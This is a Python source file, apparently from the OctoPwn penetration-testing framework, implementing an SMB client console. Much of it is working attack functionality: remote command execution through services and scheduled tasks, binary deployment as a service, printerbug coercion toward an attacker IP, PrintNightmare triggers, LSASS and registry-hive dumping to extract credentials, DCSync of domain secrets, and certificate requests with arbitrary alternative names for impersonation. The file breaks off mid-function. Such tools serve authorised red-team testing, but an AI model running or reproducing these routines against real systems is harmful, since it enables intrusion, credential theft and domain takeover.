from datetime import datetime
import os
import shlex
import ntpath
import asyncio
import fnmatch
import traceback
import copy
import platform

from aiosmb import logger
from octopwn.clients.base import ClientConsoleBase
from octopwn.common.utils import sizeof_fmt, gts
from aiosmb.commons.interfaces.machine import SMBMachine
from aiosmb.commons.interfaces.directory import SMBDirectory
from aiosmb.commons.interfaces.share import SMBShare
from aiosmb.commons.interfaces.file import SMBFile
from aiosmb.dcerpc.v5.common.service import SMBServiceStatus
from aiosmb.examples.smbpathcompleter import SMBPathCompleter
from aiosmb.dcerpc.v5.interfaces.icprmgr import ICPRRPC
from aiosmb.dcerpc.v5.connection import DCERPC5Connection
from aiosmb.dcerpc.v5.common.connection.authentication import DCERPCAuth
from aiosmb.dcerpc.v5.interfaces.endpointmgr import EPM
from asysocks.client import SocksTunnelError
from pypykatz.registry.aoffline_parser import OffineRegistry
from pypykatz.alsadecryptor.asbmfile import SMBFileReader
from pypykatz.apypykatz import apypykatz


class SMBClient(ClientConsoleBase):
	def __init__(self, client_id, connection, cmd_q, msg_queue, prompt, octopwnobj):
		ClientConsoleBase.__init__(self, client_id, connection, cmd_q, msg_queue, prompt, octopwnobj)
		self.machine: SMBMachine = None
		self.is_anon = False
		self.no_dce = False
		self.nologon_commands.append('login')
		self.nologon_commands.append('no_dce')
		self.nologon_commands.append('certreq')
		self.nologon_commands.append('certreqonbehalf')
		self.shares = {} #name -> share
		self.__current_share = None
		self.__current_directory = None
		self.__dcsync_task = None
		self.__progress_tasks = {}

	def _use_completions(self):
		return SMBPathCompleter(get_current_dirs = self.get_current_shares)

	def _cd_completions(self):
		return SMBPathCompleter(get_current_dirs = self.get_current_dirs)

	def _get_completions(self):
		return SMBPathCompleter(get_current_dirs = self.get_current_files)
	
	def _del_completions(self):
		return SMBPathCompleter(get_current_dirs = self.get_current_files)
	
	def _sid_completions(self):
		return SMBPathCompleter(get_current_dirs = self.get_current_files)
	
	def _dirsid_completions(self):
		return SMBPathCompleter(get_current_dirs = self.get_current_dirs)
	
	async def start(self):
		return True, None

	async def _on_close(self):
		await self.do_logout()
	
	async def do_login(self):
		"""Connect + login"""
		try:
			self.connection = copy.deepcopy(self.original_connection)
			_, err = await self.connection.login()
			if err is not None:
				raise err
			self.machine = SMBMachine(self.connection, print_cb=self.print)
			if self.no_dce is False:
				await self.do_shares(show = False)
			self.logon_ok = True
			await self.print('Login success')
			return True, None
		
		except SocksTunnelError as e:
			await self.print_exc(e.innerexception)
			return None, e

		except Exception as e:
			await self.print_exc(e)
			return None, e

	##### HELPER FOR FILE BROWSER GUI

	async def listDirectory(self, path):
		"""JS filebrowser helper"""
		results = []
		try:
			dirobj = SMBDirectory.from_remotepath(self.connection, path)
			async for fsobj, objtype, err in dirobj.list_gen(self.connection):
				if err is not None:
					raise err
				res = {}
				if objtype == 'dir':
					res = {
						'type': 'dir',
						'name' : fsobj.name,
						'creation_time'    : gts(fsobj.creation_time),
						'last_access_time' : gts(fsobj.last_access_time),
						'last_write_time'  : gts(fsobj.last_write_time),
						'change_time'      : gts(fsobj.change_time),
						'allocation_size': fsobj.allocation_size,
						'attributes' : fsobj.attributes,
					}
				else:
					res = {
						'type': 'file',
						'name' : fsobj.name,
						'size' : fsobj.size,
						'creation_time'    : gts(fsobj.creation_time),
						'last_access_time' : gts(fsobj.last_access_time),
						'last_write_time'  : gts(fsobj.last_write_time),
						'change_time'      : gts(fsobj.change_time),
						'allocation_size': fsobj.allocation_size,
						'attributes' : fsobj.attributes,
					}
				results.append(res)
			return results, None
		except Exception as e:
			await self.print_exc(e)
			return None, e

	async def deleteDirectory(self, path):
		try:
			# should add this in aiosmb :(
			uncpath = '\\\\%s\\%s' % (self.connection.target.get_hostname_or_ip(), path)
			res, err = await SMBDirectory.delete_unc(self.connection, uncpath)
			if err is not None:
				raise err
			return True, None
		except Exception as e:
			await self.print_exc(e)
			return None, e
	
	async def createDirectory(self, path):
		try:
			res, err = await SMBDirectory.create_remote(self.connection, path)
			if err is not None:
				raise err
			return True, None
		except Exception as e:
			await self.print_exc(e)
			return None, e
	
	async def downloadFile_inner(self, path:str, out_q: asyncio.Queue):
		smbfile:SMBFile = None
		try:
			smbfile = SMBFile.from_remotepath(self.connection, path)
			_, err = await smbfile.open(self.connection)
			if err is not None:
				raise err
			
			async for data, err in smbfile.read_chunked():
				if err is not None:
					raise err
				if data is None:
					break
				await out_q.put([False, data, smbfile.size, None])

			await out_q.put([True, None, smbfile.size, None])
		except Exception as e:
			await self.print_exc(e)
			await out_q.put([True, None, smbfile.size, str(e)])
			return None, e
		finally:
			if smbfile is not None:
				await smbfile.close()
	
	async def downloadFile(self, path):
		try:
			out_q = asyncio.Queue()				
			dlt = asyncio.create_task(self.downloadFile_inner(path, out_q))
			return out_q, dlt, None
		except Exception as e:
			await self.print_exc(e)
			return None, None, e
	
	async def deleteFile(self, path):
		try:
			res, err = await SMBFile.delete_rempath(self.connection, path)
			if err is not None:
				raise err
			return True, None
		except Exception as e:
			await self.print_exc(e)
			return None, e

	##### HELPER ENDS HERE

	async def do_logout(self):
		self.logon_ok = False
		if self.machine is not None:
			await self.machine.close()
		self.machine = None

		if self.connection is not None:
			try:
				await self.connection.terminate()
			except Exception as e:
				logger.exception('connection.close')
		self.connection = None
		return True, None

	async def do_nodce(self):
		"""Disables automatic share listing on login"""
		self.no_dce = True
		return True, None

	async def do_shares(self, show = True):
		"""Lists available shares"""
		try:
			if self.machine is None:
				await self.print('Not logged in! Use "login" first!')
				return False, Exception('Not logged in!')
			async for share, err in self.machine.list_shares():
				if err is not None:
					raise err
				self.shares[share.name] = share
				if show is True:
					await self.print(share.name)
			return True, None
		except Exception as e:
			if show is True:
				await self.print_exc(e)
			return None, e
		

	async def do_sessions(self):
		"""Lists sessions of connected users"""
		try:
			async for sess, err in self.machine.list_sessions():
				if err is not None:
					raise err
				await self.print("%s : %s" % (sess.username, sess.ip_addr))
			return True, None
		except Exception as e:
			await self.print_exc(e)

	async def do_domains(self):
		"""Lists domain"""
		try:
			async for domain, err in self.machine.list_domains():
				if err is not None:
					raise err
				await self.print(domain)
			return True, None
		except Exception as e:
			await self.print_exc(e)

	async def do_localgroups(self):
		"""Lists local groups"""
		try:
			async for name, sid, err in self.machine.list_localgroups():
				if err is not None:
					raise err
				await self.print("%s : %s" % (name, sid))
			return True, None
		except Exception as e:
			await self.print_exc(e)
	
	async def do_domaingroups(self, domain_name):
		"""Lists groups in a domain"""
		try:
			async for name, sid, err in self.machine.list_groups(domain_name):
				if err is not None:
					raise err
				await self.print("%s : %s" % (name, sid))
			return True, None
		except Exception as e:
			await self.print_exc(e)
	
	async def do_groupmembers(self, domain_name, group_name):
		"""Lists members of an arbitrary group"""
		try:
			async for domain, username, sid, err in self.machine.list_group_members(domain_name, group_name):
				if err is not None:
					raise err
				await self.print("%s\\%s : %s" % (domain, username, sid))

			return True, None
		except Exception as e:
			await self.print_exc(e)

	async def do_localgroupmembers(self, group_name):
		"""Lists members of a local group"""
		try:
			async for domain, username, sid, err in self.machine.list_group_members('Builtin', group_name):
				if err is not None:
					raise err
				await self.print("%s\\%s : %s" % (domain, username, sid))
			
			return True, None
		except Exception as e:
			await self.print_exc(e)

	async def do_use(self, share_name):
		"""selects share to be used"""
		try:
			if self.is_anon is False or self.no_dce:
				#anonymous connection might not have access to IPC$ so we are skipping the check
				if len(self.shares) == 0:
					_, err = await self.do_shares(show = False)
					if err is not None:
						raise err

				if share_name not in self.shares:
					if share_name.upper() not in self.shares:
						await self.print('Error! Uknown share name %s' % share_name)
						return
					share_name = share_name.upper()

				self.__current_share = self.shares[share_name]
			else:
				self.__current_share = SMBShare.from_unc('\\\\%s\\%s' % (self.connection.target.get_hostname_or_ip(), share_name))
			_, err = await self.__current_share.connect(self.connection)
			if err is not None:
				raise err
			self.__current_directory = self.__current_share.subdirs[''] #this is the entry directory
			await self.change_prompt('[%s]$ ' % self.__current_directory.unc_path)
			_, err = await self.do_refreshcurdir()
			if err is not None:
				raise err
			return True, None
		except Exception as e:
			await self.print_exc(e)
			return None, e
			
	async def do_dir(self):
		"""Lists current directory contents"""
		return await self.do_ls()

	async def do_ls(self):
		"""Lists current directory contents"""
		try:
			if self.__current_share is None:
				await self.print('No share selected!')
				return
			if self.__current_directory is None:
				await self.print('No directory selected!')
				return
			
			for entry in self.__current_directory.get_console_output():
				await self.print(entry)
			
			return True, None

		except Exception as e:
			await self.print_exc(e)
			return None, e

	async def do_refreshcurdir(self):
		"""Refreshes file list in current directory"""
		try:
			async for entry in self.machine.list_directory(self.__current_directory):
				#no need to put here anything, the dir bject will store the refreshed data
				a = 1
			
			return True, None
		except Exception as e:
			await self.print_exc(e)
			return None, e

	async def do_cd(self, directory_name):
		"""Change directory"""
		try:
			if self.__current_share is None:
				await self.print('No share selected!')
				return False, None
			if self.__current_directory is None:
				await self.print('No directory selected!')
				return False, None
			
			if directory_name not in self.__current_directory.subdirs:
				if directory_name == '..':
					self.__current_directory = self.__current_directory.parent_dir
					await self.change_prompt('[%s] $' % (self.__current_directory.unc_path))
					return True, None
				else:
					await self.print('The directory "%s" is not in parent directory "%s"' % (directory_name, self.__current_directory.fullpath))
					return False, None
			
			else:
				self.__current_directory = self.__current_directory.subdirs[directory_name]
				await self.change_prompt('[%s] $' % (self.__current_directory.unc_path))
				_, err = await self.do_refreshcurdir()
				if err is not None:
					raise err

				return True, None
			
		except Exception as e:
			await self.print_exc(e)
			return None, e

	def get_current_shares(self):
		if len(self.shares) == 0:
			return []
		return list(self.shares.keys())

	def get_current_dirs(self):
		if self.__current_directory is None:
			return []
		return list(self.__current_directory.subdirs.keys())

	def get_current_files(self):
		if self.__current_directory is None:
			return []
		return list(self.__current_directory.files.keys())

	async def do_getfilesd(self, file_name):
		"""Gets security descriptor for a file in the current directory"""
		try:
			if file_name not in self.__current_directory.files:
				await self.print('file not in current directory!')
				return False, None
			file_obj = self.__current_directory.files[file_name]
			sd, err = await file_obj.get_security_descriptor(self.connection)
			if err is not None:
				raise err
			await self.print(sd.to_sddl())
			return True, None

		except Exception as e:
			await self.print_exc(e)
			return None, e

	async def do_getdirsd(self):
		"""Gets security descriptor for current directory"""
		try:
			sd, err = await self.__current_directory.get_security_descriptor(self.connection)
			if err is not None:
				raise err
			await self.print(str(sd.to_sddl()))
			return True, None
		except Exception as e:
			await self.print_exc(e)
			return None, e

	async def do_services(self):
		"""Lists remote services"""
		try:
			async for service, err in self.machine.list_services():
				if err is not None:
					raise err
				await self.print(str(service.name))
			
			return True, None
			
		except Exception as e:
			await self.print_exc(e)
			return None, e

	async def do_serviceen(self, service_name):
		"""Enables a remote service"""
		try:
			res, err = await self.machine.enable_service(service_name)
			if err is not None:
				raise err
			await self.print('Service enabled')
			return True, None
		except Exception as e:
			await self.print_exc(e)
			return None, e

	async def do_servicecreate(self, service_name, command, display_name = None):
		"""Creates a remote service"""
		try:
			_, err = await self.machine.create_service(service_name, command, display_name)
			if err is not None:
				raise err
			await self.print('Service created!')
			return True, None

		except Exception as e:
			await self.print_exc(e)
			return None, e
	
	async def do_servicecmdexec(self, command, timeout = 1):
		"""Executes a shell command as a service and returns the result"""
		try:
			buffer = b''
			if timeout is None or timeout == '':
				timeout = 1
			timeout = int(timeout)
			async for data, err in self.machine.service_cmd_exec(command):
				if err is not None:
					raise err
				if data is None:
					break
				
				try:
					await self.print(data.decode())
				except:
					await self.print(data.hex())
			return True, None

		except Exception as e:
			await self.print_exc(e)
			return None, e

	async def do_servicedeploy(self, path_to_exec, remote_path):
		"""Deploys a binary file from the local system as a service on the remote system"""
		#servicedeploy /home/devel/Desktop/cmd.exe /shared/a.exe
		try:
			basename = ntpath.basename(remote_path)
			remote_path = '\\\\%s\\%s\\%s\\%s' % (self.connection.target.get_hostname_or_ip(), self.__current_share.name, self.__current_directory.fullpath , basename)
			_, err = await self.machine.deploy_service(path_to_exec, remote_path = remote_path)
			if err is not None:
				raise err
			await self.print('Service deployed!')
			return True, None
		except Exception as e:
			await self.print_exc(e)
			return None, e

	async def do_put(self, file_name):
		"""Uploads a file to the remote share"""
		try:
			basename = ntpath.basename(file_name)
			dst = '\\%s\\%s\\%s' % (self.__current_share.name, self.__current_directory.fullpath , basename)
			smbfile = SMBFile.from_remotepath(self.connection, dst)
			_, err = await smbfile.open(self.connection, 'w')
			if err is not None:
				raise err
			
			lastwrite = datetime.utcnow()
			starttime = lastwrite
			file_size = os.path.getsize(file_name)
			total_written = 0
			await self.print('Uploading...')
			with open(file_name, 'rb') as f:
				while True:
					data = f.read(65*1024*1024)
					if data == b'':
						break
					total, err = await smbfile.write(data)
					if err is not None:
						raise err
					total_written += total
					now = datetime.utcnow()
					dt = (now - lastwrite).total_seconds()
					if dt < 2:
						# only printing out every >2 secs
						continue
					lastwrite = now
					speed = round( (len(data) / dt) / 1048576, 2)
					await self.print("Uploading... %s%% (%s Mb/s)" % ( round((total_written/file_size)*100, 2), speed  ))
			
			await smbfile.close()
			speed = round( (total_written / (datetime.utcnow() - starttime).total_seconds()) / 1048576, 2)
			await self.print("File uploaded OK (%s at %s Mb/s )!" % (sizeof_fmt(total_written), speed))
			_, err = await self.do_refreshcurdir()
			if err is not None:
				raise err
			
			return True, None

		except Exception as e:
			await self.print('Failed to put file! Reason: %s' % err)
			return None, e

	async def do_del(self, file_name):
		"""Removes a file from the remote share"""
		try:
			basename = ntpath.basename(file_name)
			dst = '\\%s\\%s\\%s' % (self.__current_share.name, self.__current_directory.fullpath , basename)
			_, err = await self.machine.del_file(dst)
			if err is not None:
				raise err
			await self.print('File deleted!')
			_, err = await self.do_refreshcurdir()
			if err is not None:
				raise err
			return True, None

		except Exception as e:
			await self.print_exc(e)
			return None, e

	async def do_regsave(self, hive_name, file_path):
		"""Saves a registry hive to a file on remote share"""
		try:
			_, err = await self.machine.save_registry_hive(hive_name, file_path)
			if err is not None:
				raise err
			await self.print('Hive saved!')
			return True, None
		
		except Exception as e:
			await self.print_exc(e)
			return None, e

	async def do_reglistusers(self):
		"""Saves a registry hive to a file on remote share"""
		try:
			users, err = await self.machine.reg_list_users()
			if err is not None:
				raise err
			for user in users:
				await self.print(user)
			return True, None
		
		except Exception as e:
			await self.print_exc(e)
			return None, e

	async def do_get(self, file_name):
		"""Download a file from the remote share to the current folder"""
		try:
			matched = []
			if file_name not in self.__current_directory.files:
				
				for fn in fnmatch.filter(list(self.__current_directory.files.keys()), file_name):
					matched.append(fn)
				if len(matched) == 0:
					await self.print('File with name %s is not present in the directory %s' % (file_name, self.__current_directory.name))
					return False, None
			else:
				matched.append(file_name)
			
			for file_name in matched:
				file_obj = self.__current_directory.files[file_name]
				await self.print("Downloading file %s" % file_name)
				total_written = 0
				lasttime = datetime.utcnow()
				starttime = lasttime
				await self.print('Downloading...')
				with open(file_name, 'wb') as outfile:
					async for data, err in self.machine.get_file_data(file_obj):
						if err is not None:
							raise err
						if data is None:
							break
						outfile.write(data)
						total_written += len(data)
						now = datetime.utcnow()
						td = (now - lasttime).total_seconds()
						if td < 2:
							# only printing out every >N secs
							continue
						lasttime = now
						speed = round( (len(data) / td) / 1048576, 2)
						await self.print("Downloading... %s%% (%s Mb/s)" % ( round((total_written/file_obj.size)*100, 2), speed  ))
				speed = round( (total_written / (datetime.utcnow() - starttime).total_seconds()) / 1048576, 2)
				await self.print("File downloaded OK (%s at %s Mb/s )! %s" % (sizeof_fmt(total_written), speed, file_name))
			return True, None

		except Exception as e:
			await self.print_exc(e)
			return None, e

	async def do_mkdir(self, directory_name):
		"""Creates a directory on the remote share"""
		try:
			_, err = await self.machine.create_subdirectory(directory_name, self.__current_directory)
			if err is not None:
				raise err
			await self.print('Directory created!')
			_, err = await self.do_refreshcurdir()
			if err is not None:
				raise err
			return True, None

		except Exception as e:
			await self.print_exc(e)
			return None, e

	async def do_users(self, domain = None):
		"""List users in domain"""
		try:
			async for username, user_sid, err in self.machine.list_domain_users(domain):
				if err is not None:
					await self.print(str(err))
				await self.print('%s %s' % (username, user_sid))
			
			return True, None
		
		except Exception as e:
			await self.print_exc(e)
			return None, e

	async def do_printerbug(self, attacker_ip):
		"""Printerbug"""
		try:
			_, err = await self.machine.printerbug(attacker_ip)
			if err is not None:
				await self.print(str(err))
			await self.print('Printerbug triggered OK!')
		
			return True, None
		
		except Exception as e:
			await self.print_exc(e)
			return None, e

	async def do_tasks(self):
		"""List scheduled tasks """
		try:
			async for taskname, err in self.machine.tasks_list():
				if err is not None:
					raise err
				await self.print(taskname)
			
			return True, None
		
		except Exception as e:
			await self.print_exc(e)
			return None, e

	async def do_taskregister(self, template_file, task_name = None):
		"""Registers a new scheduled task"""
		try:
			with open(template_file, 'r') as f:
				template = f.read()

			res, err = await self.machine.tasks_register(template, task_name = task_name)
			if err is not None:
				logger.info('[!] Failed to register new task!')
				raise err
		
			return True, None
		
		except Exception as e:
			await self.print_exc(e)
			return None, e

	async def do_taskdel(self, task_name):
		"""Deletes a scheduled task	"""
		try:
			_, err = await self.machine.tasks_delete(task_name)
			if err is not None:
				raise err

			return True, None
		
		except Exception as e:
			await self.print_exc(e)
			return None, e


	async def do_taskcmdexec(self, command, timeout = 2):
		"""Executes a shell command using the scheduled tasks service"""
		try:
			if timeout is None or timeout == '':
				timeout = 1
			timeout = int(timeout)
			async for data, err in self.machine.tasks_cmd_exec(command, timeout):
				if err is not None:
					raise err
				if data is None:
					break
				
				try:
					await self.print(data.decode())
				except:
					await self.print(data)
			
		except Exception as e:
			await self.print_exc(e)

	async def do_interfaces(self):
		"""Lists all network interfaces of the remote machine """
		try:
			interfaces, err = await self.machine.list_interfaces()
			if err is not None:
				raise err
			for iface in interfaces:
				await self.print('%d: %s' % (iface['index'], iface['address']))
			
			return True, None
		except Exception as e:
			await self.print_exc(e)
			return None, e

	async def do_enumall(self, depth = 3):
		"""Enumerates all shares for all files and folders recursively """
		try:
			depth = int(depth)
			async for path, otype, err in self.machine.enum_all_recursively(depth = depth):
				if otype is not None:
					await self.print('[%s] %s' % (otype[0].upper(), path))
				if err is not None:
					await self.print('[E] %s %s' % (err, path))

			return True, None
		except Exception as e:
			await self.print_exc(e)
			return None, e

	async def do_printerenumdrivers(self):
		"""Enumerates all shares for all files and folders recursively """
		try:
			drivers, err = await self.machine.enum_printer_drivers()
			if err is not None:
				raise err
			for driver in drivers:
				await self.print(driver)
			return True, None
		except Exception as e:
			await self.print_exc(e)
			return None, e

	async def do_printnightmare(self, share, driverpath = ''):
		"""printnightmare bug using the RPRN protocol """
		try:
			if len(driverpath) == 0:
				driverpath = None
			_, err = await self.machine.printnightmare(share, driverpath)
			if err is not None:
				raise err
			
			await self.print("Done!")
			return True, None
		except Exception as e:
			await self.print_exc(e)
			return None, e
	
	async def do_parprintnightmare(self, share, driverpath = ''):
		"""printnightmare bug using the PAR protocol """
		try:
			if len(driverpath) == 0:
				driverpath = None
			_, err = await self.machine.par_printnightmare(share, driverpath)
			if err is not None:
				raise err
			
			await self.print("Done!")
			return True, None
		except Exception as e:
			await self.print_exc(e)
			return None, e

	async def do_lsassdump(self, method = 'service'):
		"""Dumps LSASS remotely, parses it to extract secrets"""
		try:
			chunksize = 65536
			if method == '':
				method = 'service'

			if method == 'task':
				await self.print('[LSASSDUMP] Start dumping LSASS with taskexec method!')
				smbfile_inner, err = await self.machine.task_dump_lsass()
					
				if err is not None:
					raise err
					
				smbfile = SMBFileReader(smbfile_inner)				
				
			elif method == 'service':
				await self.print('[LSASSDUMP] Start dumping LSASS with serviceexec method!')
				smbfile_inner, err = await self.machine.service_dump_lsass()
					
				if err is not None:
					raise err
				smbfile = SMBFileReader(smbfile_inner)

			else:
				raise Exception('Unknown execution method %s' % method)
			
			await self.print('[LSASSDUMP] LSASS dump file opened!')
			await self.print('[LSASSDUMP] parsing LSASS dump file on the remote host...')
			mimi = await apypykatz.parse_minidump_external(smbfile, chunksize=chunksize, packages = ['all'])

			await self.print('[LSASSDUMP] parsing OK!')
			await self.print('[LSASSDUMP] Deleting remote dump file...')
			_, err = await smbfile.delete()
			if err is not None:
				await self.print('Failed to delete LSASS file! Reason: %s' % err)
			else:
				await self.print('Remote LSASS file deleted OK!')

			res = mimi.to_grep()
			for line in res.split('\r\n'):
				await self.print(line)

			return True, None
		
		except Exception as e:
			await self.print_exc(e)
			return None, e
	
	async def do_regdump(self, waittime = 5):
		"""Dumps remote registry hives, parses them remotely, extracts secrets"""
		try:
			waittime = int(waittime)
			hives = ['HKLM\\SAM', 'HKLM\\SYSTEM', 'HKLM\\SECURITY']
			remote_base_path = 'C:\\Windows\\Temp\\'
			remote_share_name = '\\c$\\Windows\\Temp\\'
			enable_wait = 3

			if remote_base_path.endswith('\\') is False:
				remote_base_path += '\\'

			if remote_share_name.endswith('\\') is False:
				remote_share_name += '\\'

			po = None

			await self.print('[REGDUMP] Checking remote registry service status...')
			status, err = await self.machine.check_service_status('RemoteRegistry')
			if err is not None:
				raise err
					
			await self.print('[REGDUMP] Remote registry service status: %s' % status.name)
			if status != SMBServiceStatus.RUNNING:
				await self.print('[REGDUMP] Enabling Remote registry service')
				_, err = await self.machine.enable_service('RemoteRegistry')
				if err is not None:
					raise err
				await self.print('[REGDUMP] Starting Remote registry service')
				_, err = await self.machine.start_service('RemoteRegistry')
				if err is not None:
					raise err
				await self.print('[REGDUMP] Waiting for RemoteRegistry service...')
				await asyncio.sleep(waittime)

					
			await self.print('[REGDUMP] Remote registry service should be running now...')
			files = {}
			for hive in hives:
				fname = '%s.%s' % (os.urandom(4).hex(), os.urandom(3).hex())
				remote_path = remote_base_path + fname
				remote_sharepath = remote_share_name + fname
				remote_file = SMBFileReader(SMBFile.from_remotepath(self.machine.connection, remote_sharepath))
				files[hive.split('\\')[1].upper()] = remote_file
						
				await self.print('[REGDUMP] Dumping reghive %s to (remote) %s' % (hive, remote_path))
				_, err = await self.machine.save_registry_hive(hive, remote_path)
				if err is not None:
					raise err
			
			await self.print('[REGDUMP] Waiting for regfile dump to be written to disk...')
			await asyncio.sleep(waittime)
			
			for rfilename in files:
				rfile = files[rfilename]
				await self.print('[REGDUMP] Opening reghive file %s' % rfilename)
				_, err = await rfile.open(self.machine.connection)
				if err is not None:
					raise err
					
			try:
				await self.print('[REGDUMP] Parsing hives...')
				po = await OffineRegistry.from_async_reader(
					files['SYSTEM'], 
					sam_reader = files.get('SAM'), 
					security_reader = files.get('SECURITY'), 
					software_reader = files.get('SOFTWARE')
				)
			except Exception as e:
				await self.print('[REGDUMP] ERR! Failed to parse reghive files! Reason: %s' % e)
			else:
				await self.print('[REGDUMP] Hives parsed OK!')
					
			await self.print('[REGDUMP] Deleting remote files...')
			err = None
			for rfilename in files:
				rfile = files[rfilename]
				err = await rfile.close()
				if err is not None:
					await self.print('[REGDUMP] ERR! Failed to close hive dump file! %s' % rfilename)

				_, err = await rfile.delete()
				if err is not None:
					await self.print('[REGDUMP] ERR! Failed to delete hive dump file! %s' % rfilename)
					
			if err is None:
				await self.print('[REGDUMP] Deleting remote files OK!')
			
			res = str(po)
			for line in res.split('\r\n'):
				await self.print(line)
			
			return True, None
		
		except Exception as e:
			await self.print_exc(e)
			return None, e

	async def dcsync(self, username = None):
		fileh = None
		filepath = None
		try:
			users = []
			ctr = 0
			if username is not None:
				if len(username) > 0:
					users.append(username)
			else:
				filename = 'dcsync_%s.txt' % os.urandom(4).hex()
				filepath = filename
				if platform.system().lower() == 'emscripten':
					filepath = '/volatile/%s' % filename
				await self.print('User secrets will be dumped to: %s' % filepath)
				fileh = open(filepath, 'w', newline = '')
			
			async for secret, err in self.machine.dcsync(target_users=users):
				if err is not None:
					raise err
				if secret is None:
					continue
				ctr += 1
				if fileh is None:
					await self.print(str(secret))
				else:
					fileh.write(str(secret))
				if ctr % 100 == 0:
					await self.print('DCSync running... Secrets: %s' % ctr)
					if fileh is not None:
						fileh.flush()

			await self.print('DCSync finished! Secrets: %s' % ctr)
			if filepath is not None:
				await self.print('DCSync User secrets dumped to: %s' % filepath)
			return True, None
		
		except Exception as e:
			await self.print_exc(e)
			return None, e

		finally:
			if fileh is not None:
				fileh.close()
			self.__dcsync_task = None

	async def do_dcsync(self, username = None):
		"""Performs DCSYNC.
If username is omitted then it will target all users. 
Try to avoid targeting all users in a large domain or when 
running this on a resource-limited device.

Parameters:
	username (str): The target user whose secrets to obtain. Use this on slow systems
		"""
		self.__dcsync_task = asyncio.create_task(self.dcsync(username))
		return True, None

	async def do_stopdcsync(self):
		"""Stops active dcsync operation"""
		if self.__dcsync_task is None:
			await self.print('No active dcsync task found!')
			return True, None
		
		self.__dcsync_task.cancel()
		self.__dcsync_task = None

	async def do_interfaces(self):
		"""Lists all network interfaces of the remote machine"""
		try:
			interfaces, err = await self.machine.list_interfaces()
			if err is not None:
				raise err
			for iface in interfaces:
				await self.print('%d: %s' % (iface['index'], iface['address']))
			
			return True, None
		
		except Exception as e:
			await self.print_exc(e)
			return None, e
	
	async def do_certreq(self, service, template, cn, altname):
		"""Requests a new certificate for the user fpecified in CN with altname
service: name of the ADCS service
template: name of the certificate template to use
cn: CN of the user (in username@fqdn format like: victim@test.corp)
altname: Alternative user to be included in the cert (in username@fqdn format like: victim@test.corp) (optional)
"""
		try:
			_, err = await self.__certreq(service, template, altname = altname, cn = cn)
			if err is not None:
				raise err
			await self.print("Done!")
			return True, None
		except Exception as e:
			await self.print_exc(e)
			return False, e
	
	async def do_certreqonbehalf(self, service, template, cn, altname, onbehalf, enroll_cert, enroll_password = None):
		try:
			_, err = await self.__certreq(service, template, altname = altname, onbehalf = onbehalf, cn = cn, enroll_cert = enroll_cert, enroll_password=enroll_password)
			if err is not None:
				raise err
			return True, None
		except Exception as e:
			await self.print_exc(e)
			return False, e
	
	async def __certreq(self, service, template, altname = None, onbehalf = None, cn = None, enroll_cert = None, enroll_password = None):
		try:
			from msldap.ldap_objects.adcertificatetemplate import EKUS_NAMES
			from cryptography.hazmat.primitives.asymmetric import padding, rsa
			from cryptography.hazmat.primitives import hashes
			from cryptography.hazmat.primitives.serialization import Encoding, pkcs7, pkcs12, BestAvailableEncryption, load_pem_private_key
			from cryptography import x509
			from cryptography.x509.oid import ExtensionOID, NameOID
			from asn1crypto import core

			PRINCIPAL_NAME = x509.ObjectIdentifier("1.3.6.1.4.1.311.20.2.3")
			pfx_file = 'cert_%s.pfx' % os.urandom(4).hex()
			pfx_password = 'admin'
			
			await self.print('[+] Parsing connection parameters...')
			smb_target = self.connection.target
			ip = smb_target.get_hostname_or_ip()
			
			await self.print('[*] Using CN: %s' % cn)
			await self.print('[+] Generating RSA privat key...')
			key = rsa.generate_private_key(0x10001, 2048)

			await self.print('[+] Building certificate request...')
			attributes = {
				"CertificateTemplate": template,
			}
	
			csr = x509.CertificateSigningRequestBuilder()
			csr = csr.subject_name(
					x509.Name(
						[
							x509.NameAttribute(NameOID.COMMON_NAME, cn),
						]
					)
				)

			if altname:
				altname = core.UTF8String(altname).dump()
				csr = csr.add_extension(
					x509.SubjectAlternativeName(
						[
							x509.OtherName(PRINCIPAL_NAME, altname),
						]
					),
					critical=False,
				)

			csr = csr.sign(key, hashes.SHA256())
	
			if onbehalf is not None:
				agent_key = None
				agent_cert = None
				with open(enroll_cert, 'rb') as f:
					agent_key, agent_cert, _ = pkcs12.load_key_and_certificates(f.read(), enroll_password)
					
				pkcs7builder = pkcs7.PKCS7SignatureBuilder().set_data(csr).add_signer(agent_key, agent_cert, hashes.SHA1())
				csr = pkcs7builder.sign(Encoding.DER, options=[pkcs7.PKCS7Options.Binary])
			else:
				csr = csr.public_bytes(Encoding.DER)
			
			await self.print('[+] Connecting to EPM...')
			target, err = await EPM.create_target(ip, ICPRRPC().service_uuid, smb_target.proxy)
			if err is not None:
				raise err
			
			await self.print('[+] Connecting to ICRPR service...')
			#gssapi = AuthenticatorBuilder.to_spnego_cred(su.get_credential())
			auth = DCERPCAuth.from_smb_gssapi(self.connection.gssapi)
			connection = DCERPC5Connection(auth, target)
			rpc, err = await ICPRRPC.from_rpcconnection(connection, perform_dummy=True)
			if err is not None:
				raise err
			logger.debug('DCE Connected!')
			
			await self.print('[+] Requesting certificate from the service...')
			res, err = await rpc.request_certificate(service, csr, attributes)
			if err is not None:
				await self.print('[-] Request failed!')
				raise err
			
			
			if res['encodedcert'] in [None, b'']:
				raise Exception('No certificate was returned from server!. Full message: %s' % res)
			
			await self.print('[+] Got certificate!')
			cert = x509.load_der_x509_certificate(res['encodedcert'])
			await self.print("[*]   Cert subject: {}".format(cert.subject.rfc4514_string()))
			await self.print("[*]   Cert issuer: {}".format(cert.issuer.rfc4514_string()))
			await self.print("[*]   Cert Serial: {:X}".format(cert.serial_number))
			
			try:
				ext = cert.extensions.get_extension_for_oid(ExtensionOID.EXTENDED_KEY_USAGE)
				for oid in ext.value:
					await self.print("[*]   Cert Extended Key Usage: {}".format(EKUS_NAMES.get(oid.dotted_string, oid.dotted_string)))
			except:
				await self.print('[-]   Could not verify extended key usage')
	
			try:
				ext = cert.extensions.get_extension_for_oid(ExtensionOID.SUBJECT_ALTERNATIVE_NAME)
				for name in ext.value.get_values_for_type(x509.OtherName):
					if name.type_id == x509.ObjectIdentifier("1.3.6.1.4.1.311.20.2.3"):
						await self.print('[*]   Certificate ALT NAME: %s' % core.UTF8String.load(name.value).native)
						break
				else:
					await self.print('[-]   Certificate doesnt have ALT NAME')
			except Exception as e:
				await self.print('[-]   Certificate doesnt have ALT NAME (%s)' % e)
			
			await self.print('[+] Writing certificate to disk (file:"%s" pass: "%s")...' % (pfx_file, pfx_password))
			
			# Still waiting for the day oscrypto will have a pfx serializer :(
			# Until that we'd need to use cryptography
			with open(pfx_file, 'wb') as f:
				data = pkcs12.serialize_key_and_certificates(
					name=b"",
					key=key,
					cert=cert,
					cas=None,
